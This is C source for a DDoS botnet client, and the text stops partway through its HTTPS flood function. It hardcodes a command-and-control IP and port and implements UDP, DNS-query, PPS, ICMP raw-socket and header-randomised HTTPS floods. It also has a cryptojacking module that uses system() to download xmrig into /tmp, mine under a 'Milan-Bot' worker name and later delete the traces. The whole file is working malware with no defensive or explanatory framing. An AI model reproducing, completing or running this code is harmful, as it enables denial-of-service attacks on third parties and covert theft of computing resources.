#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <assert.h>
#include <netdb.h>
#include <sys/utsname.h>

#define BUFFER_SIZE 1024
#define THREADS 100
#define DEFAULT_PACKET_SIZE 1400
#define MIN_PSIZE 128
#define MAX_PSIZE 768
#define DEFAULT_CONNECTIONS 1000
#define CNC_IP "154.6.197.35"
#define CNC_PORT 6678
#define NANOS 1000000000
#define BUFSIZE 4096
#define VLEN 5

#define PPS_THREADS 100
#define PPS_PACKET_SIZE 64

#define HOME_DEFAULT_THREADS 100
#define HOME_DEFAULT_PACKET_SIZE 1458

#define FORTNITE_THREADS 256
#define FORTNITE_AMPLIFICATION 256
#define MAX_PACKET_SIZE 1458

#define VEGA_THREADS 256

#define HTTP_THREADS 256
#define HTTP_BUFFER_SIZE 4096

#define HTTPS_THREADS 512
#define MAX_HEADERS 50
#define MAX_HEADER_LENGTH 256

int running = 1;
int attack_running = 0;
pthread_t attack_threads[THREADS];
int thread_count = 0;

int mining_active = 0;
pid_t mining_pid = 0;
int mining_threads = 1;

int string_count = 0;
char **hex_strings;
char characters[] = "abcdefghijklmnopqrstuvwxyz1234567890";

void *http_attack(void *arg);
void *http_flood(void *arg);
void *https_attack(void *arg);
void *https_flood(void *arg);
void start_mining(const char* wallet, int threads);
void stop_mining();
void update_mining_status(int sock);

struct connection {
    int fd;
    in_addr_t saddr;
    in_addr_t daddr;
    uint16_t sport;
    uint16_t dport;
    uint32_t seq;
    uint32_t ack;
    uint8_t state;
    uint32_t sent;
    uint64_t time;
    struct sockaddr_in addr;
    uint32_t window;
    uint8_t tries;
    uint8_t resets;
    uint32_t pending;
    uint32_t tsval;
    uint32_t tsecr;
    uint64_t trip;
    uint8_t re;
    uint64_t resp;
    uint16_t fake_win;
    uint8_t scaling;
    uint64_t rett;
};

struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

struct custom_iphdr {
    unsigned int ihl:4;
    unsigned int version:4;
    unsigned char tos;
    unsigned short tot_len;
    unsigned short id;
    unsigned short frag_off;
    unsigned char ttl;
    unsigned char protocol;
    unsigned short check;
    unsigned int saddr;
    unsigned int daddr;
};

struct custom_icmphdr {
    unsigned char type;
    unsigned char code;
    unsigned short check;
    unsigned short un1;
    unsigned short un2;
};

struct pps_flood_args {
    char ip[32];
    int port;
    time_t end;
    int intensity;
};

struct fortnite_args {
    char target_ip[32];
    int target_port;
    time_t end_time;
    int packet_size;
    int amplification;
};

typedef struct {
    char target[256];
    int port;
    int duration;
    int packet_size;
    char method[32];
    int pps_rate;
    int connections;
} FloodArgs;

#define ATK_OPT_DPORT 0
#define ATK_OPT_SPORT 1
#define ATK_OPT_PAYLOAD_SIZE 2
#define ATK_OPT_PAYLOAD_RAND 3

struct attack_option {
    uint8_t key;
    char *val;
};

struct attack_target {
    struct sockaddr_in sock_addr;
    uint8_t netmask;
    uint32_t addr;
};

struct dns_header {
    unsigned short id;
    unsigned char rd :1;
    unsigned char tc :1;
    unsigned char aa :1;
    unsigned char opcode :4;
    unsigned char qr :1;
    unsigned char rcode :4;
    unsigned char cd :1;
    unsigned char ad :1;
    unsigned char z :1;
    unsigned char ra :1;
    unsigned short qdcount;
    unsigned short ancount;
    unsigned short nscount;
    unsigned short arcount;
};

void create_dns_query(char *buffer, size_t *length, int max_size, int amplification) {
    struct dns_header *dns = (struct dns_header *)buffer;
    dns->id = htons(rand() % 65535);
    dns->qr = 0;
    dns->opcode = 0;
    dns->aa = 0;
    dns->tc = 0;
    dns->rd = 1;
    dns->ra = 0;
    dns->z = 0;
    dns->ad = 0;
    dns->cd = 0;
    dns->rcode = 0;
    dns->qdcount = htons(amplification);
    dns->ancount = 0;
    dns->nscount = 0;
    dns->arcount = 0;

    char *query = buffer + sizeof(struct dns_header);
    
    for (int i = 0; i < amplification; i++) {
        strcpy(query, "\x06google\x03com\x00");
        query += strlen("\x06google\x03com\x00") + 1;
        *(unsigned short*)query = htons(255);
        *(unsigned short*)(query + 2) = htons(1);
        query += 4;
    }
    
    size_t base_len = sizeof(struct dns_header) + (amplification * (strlen("\x06google\x03com\x00") + 1 + 4));
    
    if (max_size > base_len) {
        size_t padding = max_size - base_len;
        memset(buffer + base_len, rand() % 256, padding);
        *length = max_size;
    } else {
        *length = base_len;
    }
}

void *fortnite_attack(void *arg) {
    struct fortnite_args *info = (struct fortnite_args *)arg;
    
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        return NULL;
    }
    
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(info->target_port);
    inet_pton(AF_INET, info->target_ip, &target.sin_addr);

    char *dns_query = malloc(info->packet_size);
    size_t dns_len;
    
    int packet_count = 0;
    time_t start_time = time(NULL);
    
    while (time(NULL) < info->end_time && attack_running) {
        create_dns_query(dns_query, &dns_len, info->packet_size, info->amplification);
        
        for (int i = 0; i < 10; i++) {
            sendto(sock, dns_query, dns_len, MSG_DONTWAIT, 
                  (struct sockaddr *)&target, sizeof(target));
        }
        packet_count += 10;
        
        usleep(1000);
    }
    
    free(dns_query);
    close(sock);
    return NULL;
}

void *fortnite_flood(void *arg) {
    FloodArgs *args = (FloodArgs *)arg;
    
    struct fortnite_args info;
    strncpy(info.target_ip, args->target, sizeof(info.target_ip) - 1);
    info.target_ip[sizeof(info.target_ip) - 1] = '\0';
    info.target_port = args->port;
    info.end_time = time(NULL) + args->duration;
    info.packet_size = args->packet_size > 0 ? args->packet_size : 512;
    info.amplification = FORTNITE_AMPLIFICATION;

    pthread_t thread[FORTNITE_THREADS];
    for (int i = 0; i < FORTNITE_THREADS; i++) {
        pthread_create(&thread[i], NULL, fortnite_attack, &info);
    }

    for (int i = 0; i < FORTNITE_THREADS; i++) {
        pthread_join(thread[i], NULL);
    }

    return NULL;
}

void *home_flood(void *arg) {
    FloodArgs *args = (FloodArgs *)arg;
    
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) return NULL;
    
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);
    
    char *packet = malloc(args->packet_size);
    if (packet == NULL) {
        close(sockfd);
        return NULL;
    }
    
    for (int i = 0; i < args->packet_size; i++) {
        packet[i] = rand() % 256;
    }
    
    time_t start_time = time(NULL);
    time_t end_time = start_time + args->duration;
    
    while (time(NULL) < end_time && attack_running) {
        sendto(sockfd, packet, args->packet_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
    }
    
    free(packet);
    close(sockfd);
    return NULL;
}

uint64_t getCurrentTime() {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)(ts.tv_sec * NANOS + ts.tv_nsec);
}

unsigned short calculateChecksum(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    unsigned short oddbyte;
    register short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return answer;
}

void binaryToHex(unsigned char *in, size_t insz, char *out, size_t outsz) {
    unsigned char *pin = in;
    const char *hex = "0123456789ABCDEF";
    char *pout = out;
    for (; pin < in + insz; pout += 2, pin++) {
        pout[0] = hex[(*pin >> 4) & 0xF];
        pout[1] = hex[*pin & 0xF];
        if (pout + 3 - out > outsz) break;
    }
    pout[-1] = 0;
}

char *customStrtok(char *input, char *delimiter, char **string) {
    if (input != NULL) *string = input;
    if (*string == NULL) return *string;
    char *end = strstr(*string, delimiter);
    if (end == NULL) {
        char *temp = *string;
        *string = NULL;
        return temp;
    }
    char *temp = *string;
    *end = '\0';
    *string = end + strlen(delimiter);
    return temp;
}

void *pps_attack(void *arg) {
    struct pps_flood_args *info = (struct pps_flood_args *)arg;

    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(info->port);
    target.sin_addr.s_addr = inet_addr(info->ip);

    char packet[PPS_PACKET_SIZE];
    memset(packet, 0x41, sizeof(packet));

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return NULL;
    
    int broadcast = 1;
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));

    while (time(NULL) < info->end && attack_running) {
        for(int i = 0; i < info->intensity; i++) {
            sendto(sock, packet, PPS_PACKET_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
        }
    }

    close(sock);
    return NULL;
}

static uint32_t rand_next(void) {
    return rand();
}

static void rand_str(char *string, int len) {
    while(len--) *string++ = characters[rand() % sizeof(characters)];
}

int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t key, int def) {
    for (int i = 0; i < opts_len; i++) {
        if (opts[i].key == key) return atoi(opts[i].val);
    }
    return def;
}

unsigned short calculate_checksum(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    unsigned short oddbyte;
    register short answer;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return answer;
}

void init_hex_strings() {
    hex_strings = malloc(3 * sizeof(char*));
    hex_strings[0] = "\x61\x62\x63\x31\x32\x33";
    hex_strings[1] = "\x6d\x61\x72\x6b\x75\x73\x20\x69\x73\x20\x67\x61\x79";
    hex_strings[2] = "\x75\x72\x30\x61\x20\x69\x73\x20\x61\x20\x73\x6b\x69\x64";
    string_count = 3;
}

char* get_random_hex_string() {
    return hex_strings[rand() % string_count];
}

void attack_watchdog(int seconds) {
    if (!fork()) {
        sleep(seconds);
        kill(getppid(), SIGTERM);
        exit(0);
    }
}

static int random_int(int nMin, int nMax) {
    return rand() % ((nMax + 1) - nMin) + nMin;
}

static uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
    register unsigned long sum = 0;
    for (sum = 0; count > 1; count -= 2) sum += *addr++;
    if (count == 1) sum += (char)*addr;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

void stop_attack() {
    attack_running = 0;
    for (int i = 0; i < thread_count; i++) pthread_cancel(attack_threads[i]);
    thread_count = 0;
}

void *std_attack(void *arg) {
    FloodArgs *flood_args = (FloodArgs *)arg;
    uint8_t targs_len = 1;
    struct attack_target *targs = calloc(targs_len, sizeof(struct attack_target));
    uint8_t opts_len = 4;
    struct attack_option *opts = calloc(opts_len, sizeof(struct attack_option));
    targs[0].sock_addr.sin_family = AF_INET;
    targs[0].sock_addr.sin_addr.s_addr = inet_addr(flood_args->target);
    targs[0].netmask = 32;
    targs[0].addr = targs[0].sock_addr.sin_addr.s_addr;
    opts[0].key = ATK_OPT_DPORT;
    opts[0].val = malloc(16);
    sprintf(opts[0].val, "%d", flood_args->port);
    opts[1].key = ATK_OPT_SPORT;
    opts[1].val = malloc(16);
    sprintf(opts[1].val, "%d", rand() % 65535);
    opts[2].key = ATK_OPT_PAYLOAD_SIZE;
    opts[2].val = malloc(16);
    sprintf(opts[2].val, "%d", flood_args->packet_size);
    opts[3].key = ATK_OPT_PAYLOAD_RAND;
    opts[3].val = malloc(16);
    sprintf(opts[3].val, "%d", 1);
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    int dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1458);
    int data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, 1);
    struct sockaddr_in bind_addr = {0};
    if (sport == 0xffff) sport = rand_next();
    else sport = htons(sport);
    for (i = 0; i < targs_len; i++) {
        char *data = malloc(data_len);
        pkts[i] = data;
        if (dport == 0xffff) targs[i].sock_addr.sin_port = rand_next();
        else targs[i].sock_addr.sin_port = htons(dport);
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
            free(targs);
            for (int j = 0; j < opts_len; j++) free(opts[j].val);
            free(opts);
            free(pkts);
            free(fds);
            return NULL;
        }
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in));
        if (targs[i].netmask < 32) targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
    }
    time_t start_time = time(NULL);
    time_t end_time = start_time + flood_args->duration;
    while (time(NULL) < end_time && attack_running) {
        for (i = 0; i < targs_len; i++) {
            char *data = pkts[i];
            if (data_rand) rand_str(data, data_len);
            send(fds[i], data, data_len, MSG_NOSIGNAL);
        }
    }
    for (i = 0; i < targs_len; i++) {
        if (fds[i] != -1) close(fds[i]);
        if (pkts[i] != NULL) free(pkts[i]);
    }
    free(pkts);
    free(fds);
    free(targs);
    for (i = 0; i < opts_len; i++) free(opts[i].val);
    free(opts);
    return NULL;
}

void *udp_flood(void *arg) {
    FloodArgs *args = (FloodArgs *)arg;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) return NULL;
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);
    char* packet = malloc(args->packet_size);
    for (int i = 0; i < args->packet_size; i++) packet[i] = rand() % 256;
    time_t start_time = time(NULL);
    time_t end_time = start_time + args->duration;
    while (time(NULL) < end_time && attack_running) {
        sendto(sockfd, packet, args->packet_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
    }
    free(packet);
    close(sockfd);
    return NULL;
}

void *vega_hex_flood(void *arg) {
    FloodArgs *args = (FloodArgs *)arg;
    
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) return NULL;
    
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);
    
    char vega_payload[256] = {
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
        0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f,
        0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f,
        0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f,
        0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f,
        0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f,
        0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c, 0x7d, 0x7e, 0x7f,
        0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f,
        0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9a, 0x9b, 0x9c, 0x9d, 0x9e, 0x9f,
        0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5, 0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf,
        0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xbb, 0xbc, 0xbd, 0xbe, 0xbf,
        0xc0, 0xc1, 0xc2, 0xc3, 0xc4, 0xc5, 0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xcb, 0xcc, 0xcd, 0xce, 0xcf,
        0xd0, 0xd1, 0xd2, 0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xdb, 0xdc, 0xdd, 0xde, 0xdf,
        0xe0, 0xe1, 0xe2, 0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee, 0xef,
        0xf0, 0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc, 0xfd, 0xfe, 0xff
    };
    
    char packet[args->packet_size];
    for (int i = 0; i < args->packet_size; i++) {
        packet[i] = vega_payload[i % 256];
    }
    
    time_t start_time = time(NULL);
    time_t end_time = start_time + args->duration;
    
    while (time(NULL) < end_time && attack_running) {
        sendto(sockfd, packet, args->packet_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
    }
    
    close(sockfd);
    return NULL;
}

void *udp_bypass(void *arg) {
    FloodArgs *args = (FloodArgs *)arg;
    srand(time(NULL) ^ getpid());
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return NULL;
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_addr.s_addr = inet_addr(args->target);
    addr.sin_port = htons(args->port);
    addr.sin_family = AF_INET;
    connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    int len;
    char buf[MAX_PSIZE];
    time_t start_time = time(NULL);
    time_t end_time = start_time + args->duration;
    while (time(NULL) < end_time && attack_running) {
        len = random_int(MIN_PSIZE, MAX_PSIZE);
        rand_str(buf, len);
        send(sock, buf, len, MSG_NOSIGNAL);
    }
    close(sock);
    return NULL;
}

void *icmp_hex_flood(void *arg) {
    FloodArgs *args = (FloodArgs *)arg;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) return NULL;
    char rdbuf[4096];
    memset(rdbuf, 0, sizeof(rdbuf));
    struct custom_iphdr *iph = (struct custom_iphdr *)rdbuf;
    struct custom_icmphdr *icmph = (struct custom_icmphdr *)(rdbuf + sizeof(struct custom_iphdr));
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_addr.s_addr = inet_addr(args->target);
    addr.sin_family = AF_INET;
    iph->daddr = addr.sin_addr.s_addr;
    iph->ttl = 128;
    iph->version = 4;
    iph->protocol = IPPROTO_ICMP;
    iph->ihl = 5;
    iph->tos = 0;
    iph->frag_off = 0;
    iph->id = htonl(54321);
    iph->tot_len = sizeof(struct custom_iphdr) + sizeof(struct custom_icmphdr) + 4096;
    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, iph->tot_len);
    icmph->un1 = 0;
    icmph->un2 = rand();
    icmph->type = 8;
    icmph->code = 0;
    icmph->check = 0;
    icmph->check = checksum_generic((uint16_t *)(rdbuf + sizeof(struct custom_iphdr)), sizeof(struct custom_icmphdr));
    char *string = get_random_hex_string();
    int len = strlen(string);
    memcpy((void *)icmph, string, len);
    time_t start_time = time(NULL);
    time_t end_time = start_time + args->duration;
    while (time(NULL) < end_time && attack_running) {
        sendto(sock, rdbuf, iph->tot_len, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
        icmph->un1++;
    }
    close(sock);
    return NULL;
}

void *pps_flood_attack(void *arg) {
    FloodArgs *args = (FloodArgs *)arg;
    
    struct pps_flood_args info;
    strncpy(info.ip, args->target, 31);
    info.port = args->port;
    info.end = time(NULL) + args->duration;
    info.intensity = args->pps_rate > 0 ? args->pps_rate : 10;

    srand(time(NULL));

    pthread_t thread[PPS_THREADS];
    for (int i = 0; i < PPS_THREADS; i++) {
        pthread_create(&thread[i], NULL, pps_attack, &info);
    }

    for (int i = 0; i < PPS_THREADS; i++) {
        pthread_join(thread[i], NULL);
    }

    return NULL;
}

char* detect_architecture() {
    struct utsname buf;
    if (uname(&buf) == 0) {
        if (strstr(buf.machine, "x86_64") != NULL) return "x86_64";
        if (strstr(buf.machine, "x86") != NULL || strstr(buf.machine, "i386") != NULL || strstr(buf.machine, "i686") != NULL) return "x86_32";
        if (strstr(buf.machine, "arm") != NULL || strstr(buf.machine, "aarch64") != NULL) return "arm";
        if (strstr(buf.machine, "mips") != NULL) return "mips";
        if (strstr(buf.machine, "ppc") != NULL) return "powerpc";
        static char machine[32];
        strncpy(machine, buf.machine, sizeof(machine)-1);
        return machine;
    }
    return "unknown";
}

void start_mining(const char* wallet, int threads) {
    if (mining_active) {
        stop_mining();
    }
    
    system("cd /tmp && wget -q https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-x64.tar.gz && tar -xzf xmrig-6.18.0-linux-static-x64.tar.gz");
    
    char random_suffix[8];
    for (int i = 0; i < 7; i++) {
        random_suffix[i] = "abcdefghijklmnopqrstuvwxyz0123456789"[rand() % 36];
    }
    random_suffix[7] = '\0';
    
    char mining_command[512];
    snprintf(mining_command, sizeof(mining_command),
             "cd /tmp/xmrig-6.18.0 && ./xmrig --donate-level 1 -o rx.unmineable.com:3333 -u XMR:%s.Milan-Bot-%s -k --threads=%d --background",
             wallet, random_suffix, threads);
    
    mining_pid = fork();
    if (mining_pid == 0) {
        system(mining_command);
        exit(0);
    } else {
        mining_active = 1;
        mining_threads = threads;
    }
}


void stop_mining() {
    if (mining_pid > 0) {
        kill(mining_pid, SIGTERM);
        waitpid(mining_pid, NULL, 0);
        mining_pid = 0;
    }
    mining_active = 0;
    

    system("pkill xmrig");
    system("rm -rf /tmp/xmrig*");
}


void update_mining_status(int sock) {
    char status[256];
    if (mining_active) {
        snprintf(status, sizeof(status), "[Mining] Active - Threads: %d - PID: %d\r\n", 
                 mining_threads, mining_pid);
    } else {
        snprintf(status, sizeof(status), "[Mining] Inactive\r\n");
    }
    send(sock, status, strlen(status), 0);
}

void *https_attack(void *arg) {
    FloodArgs *args = (FloodArgs *)arg;
    
    char *user_agents[] = {
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    };
    int user_agent_count = 13;
    
    char *accept_headers[] = {
        "*/*",
        "image/*",
        "image/webp,image/apng",
        "text/html",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    };
    int accept_header_count = 9;
    
    char *cache_headers[] = {
        "no-cache",
        "no-store",
        "private",
        "must-revalidate",
        "proxy-revalidate",
        "max-age=0",
        "s-maxage=0",
        "max-age=60",
        "max-age=3600",
        "max-age=86400"
    };
    int cache_header_count = 10;
    
    char *language_headers[] = {
        "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
        "en-US,en;q=0.5",
        "en-US,en;q=0.9",
        "de-CH;q=0.7",
        "da, en-gb;q=0.8, en;q=0.7"
    };
    int language_header_count = 5;
    
    char *encoding_headers[] = {
        "gzip, deflate, br",
        "compress, gzip",
        "deflate, gzip",
        "gzip, identity"
    };
    int encoding_header_count = 4;
    
    char *fetch_modes[] = {
        "navigate",
        "same-origin",
        "no-cors",
        "cors"
    };
    int fetch_mode_count = 4;
    
    char *fetch_sites[] = {
        "same-origin",
        "same-site",
        "cross-site",
        "none"
    };
    int fetch_site_count = 4;
    
    char *fetch_dests[] = {
        "document",
        "image",
        "script",
        "style",
        "font",
        "video",
        "audio"
    };
    int fetch_dest_count = 7;
    
    char *paths[] = {
        "/", "/index.html", "/home", "/api", "/test", "/admin",
        "/login", "/wp-admin", "/images/logo.png", "/css/style.css",
        "/js/main.js", "/api/v1/users", "/search", "/products",
        "/blog", "/contact", "/about", "/dashboard"
    };
    int path_count = 18;

    char *sys_os[] = {
        "Windows 1.01",
        "Windows 1.02", 
        "Windows 1.03",
        "Windows 1.04",
        "Windows 2.01",
        "Windows 3.0",
        "Windows NT 3.1",
        "Windows NT 3.5",
        "Windows 95",
        "Windows 98",
        "Windows 2006",
        "Windows NT 4.0",
        "Windows 95 Edition",
        "Windows 98 Edition",
        "Windows Me",
        "Windows Business",
        "Windows XP",
        "Windows 7",
        "Windows 8",
        "Windows 10 version 1507"
    };
    int sys_os_count = 20;
    
    char *win_arch[] = {
        "x86-16",
        "x86-16, IA32",
        "IA-32", 
        "IA-32, Alpha, MIPS",
        "IA-32, Alpha, MIPS, PowerPC",
        "Itanium",
        "x86_64",
        "IA-32, x86-64",
        "IA-32, x86-64, ARM64",
        "x86-64, ARM64"
    };
    int win_arch_count = 10;
    
    char *win_ch[] = {
        "2012 R2",
        "2019 R2", 
        "2012 R2 Datacenter",
        "Server Blue",
        "Longhorn Server",
        "Whistler Server",
        "Shell Release",
        "Daytona",
        "Razzle",
        "HPC 2008"
    };
    int win_ch_count = 10;

    time_t end_time = time(NULL) + args->duration;
    
    while (time(NULL) < end_time && attack_running) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            continue;
        }

        struct sockaddr_in target;
        memset(&target, 0, sizeof(target));
        target.sin_family = AF_INET;
        target.sin_port = htons(args->port);
        inet_pton(AF_INET, args->target, &target.sin_addr);

        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);

        connect(sock, (struct sockaddr *)&target, sizeof(target));
        
        fd_set fdset;
        struct timeval tv;
        FD_ZERO(&fdset);
        FD_SET(sock, &fdset);
        tv.tv_sec = 1;
        tv.tv_usec = 0;

        if (select(sock + 1, NULL, &fdset, NULL, &tv) == 1) {
            int so_error;
            socklen_t len = sizeof(so_error);
            getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
            
            if (so_error == 0) {
                for (int i = 0; i < 100 && time(NULL) < end_time && attack_running; i++) {
                    char *user_agent = user_agents[rand() % user_agent_count];
                    char *path = paths[rand() % path_count];
                    char *accept_header = accept_headers[rand() % accept_header_count];
                    char *cache_header = cache_headers[rand() % cache_header_count];
                    char *language_header = language_headers[rand() % language_header_count];
                    char *encoding_header = encoding_headers[rand() % encoding_header_count];
